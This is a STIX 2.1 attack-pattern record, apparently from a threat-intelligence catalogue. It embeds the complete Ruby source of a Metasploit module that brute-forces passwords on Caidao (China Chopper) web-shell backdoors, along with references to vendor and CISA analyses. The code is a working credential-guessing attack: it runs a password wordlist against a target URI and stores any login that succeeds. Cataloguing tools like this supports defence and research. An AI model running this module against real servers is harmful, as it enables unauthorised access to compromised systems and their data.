{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--252c5d67-fbe7-47b0-b408-f54f002a989d",
    "created": "2024-08-14T16:31:12.9393Z",
    "modified": "2024-08-14T16:31:12.939304Z",
    "name": "Chinese Caidao Backdoor Bruteforce",
    "description": "This module attempts to bruteforce chinese caidao asp/php/aspx backdoor.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/caidao_bruteforce_login.rb",
            "external_id": "caidao_bruteforce_login.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-i.html"
        },
        {
            "source_name": "reference",
            "url": "https://www.mandiant.com/resources/breaking-down-the-china-chopper-web-shell-part-ii"
        },
        {
            "source_name": "reference",
            "url": "https://www.exploit-db.com/docs/27654.pdf"
        },
        {
            "source_name": "reference",
            "url": "https://www.cisa.gov/uscert/ncas/alerts/TA15-314A"
        },
        {
            "source_name": "reference",
            "url": "http://blog.csdn.net/nixawk/article/details/40430329"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/credential_collection'\nrequire 'metasploit/framework/login_scanner/caidao'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Chinese Caidao Backdoor Bruteforce',\n      'Description'    => 'This module attempts to bruteforce chinese caidao asp/php/aspx backdoor.',\n      'Author'         => [ 'Nixawk' ],\n      'References'     => [\n        ['URL', 'https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-i.html'],\n        ['URL', 'https://www.mandiant.com/resources/breaking-down-the-china-chopper-web-shell-part-ii'],\n        ['URL', 'https://www.exploit-db.com/docs/27654.pdf'],\n        ['URL', 'https://www.cisa.gov/uscert/ncas/alerts/TA15-314A'],\n        ['URL', 'http://blog.csdn.net/nixawk/article/details/40430329']\n      ],\n      'License'        => MSF_LICENSE\n    ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The URL that handles the login process', '/caidao.php']),\n        OptPath.new('PASS_FILE', [\n          false,\n          'The file that contains a list of of probable passwords.',\n          File.join(Msf::Config.install_root, 'data', 'wordlists', 'unix_passwords.txt')\n        ])\n      ])\n\n    # caidao does not have an username, there's only password\n    deregister_options('HttpUsername', 'HttpPassword', 'USERNAME', 'USER_AS_PASS', 'USERPASS_FILE', 'USER_FILE', 'DB_ALL_USERS', 'PASSWORD_SPRAY')\n  end\n\n  def scanner(ip)\n    @scanner ||= lambda {\n      cred_collection = build_credential_collection(\n        # The LoginScanner API refuses to run if there's no username, so we give it a fake one.\n        # But we will not be reporting this to the database.\n        username: 'caidao',\n        password: datastore['PASSWORD']\n      )\n\n      return Metasploit::Framework::LoginScanner::Caidao.new(\n        configure_http_login_scanner(\n          host: ip,\n          port: datastore['RPORT'],\n          uri: datastore['TARGETURI'],\n          cred_details:       cred_collection,\n          stop_on_success:    datastore['STOP_ON_SUCCESS'],\n          bruteforce_speed:   datastore['BRUTEFORCE_SPEED'],\n          connection_timeout: 5,\n          http_username: datastore['HttpUsername'],\n          http_password: datastore['HttpPassword']\n        ))\n    }.call\n  end\n\n  def report_good_cred(ip, port, result)\n    service_data = {\n      address: ip,\n      port: port,\n      service_name: 'http',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      module_fullname: self.fullname,\n      origin_type: :service,\n      private_data: result.credential.private,\n      private_type: :password,\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      last_attempted_at: DateTime.now,\n      status: result.status,\n      proof: result.proof\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def report_bad_cred(ip, rport, result)\n    invalidate_login(\n      address: ip,\n      port: rport,\n      protocol: 'tcp',\n      private: result.credential.private,\n      realm_key: result.credential.realm_key,\n      realm_value: result.credential.realm,\n      status: result.status,\n      proof: result.proof\n    )\n  end\n\n  # Attempts to login\n  def bruteforce(ip)\n    scanner(ip).scan! do |result|\n      case result.status\n      when Metasploit::Model::Login::Status::SUCCESSFUL\n        print_brute(:level => :good, :ip => ip, :msg => \"Success: '#{result.credential.private}'\")\n        report_good_cred(ip, rport, result)\n      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT\n        vprint_brute(:level => :verror, :ip => ip, :msg => result.proof)\n        report_bad_cred(ip, rport, result)\n      when Metasploit::Model::Login::Status::INCORRECT\n        vprint_brute(:level => :verror, :ip => ip, :msg => \"Failed: '#{result.credential.private}'\")\n        report_bad_cred(ip, rport, result)\n      end\n    end\n  end\n\n  def run_host(ip)\n    unless scanner(ip).check_setup\n      print_brute(:level => :error, :ip => ip, :msg => 'Backdoor type is not support')\n      return\n    end\n\n    bruteforce(ip)\n  end\nend\n"
}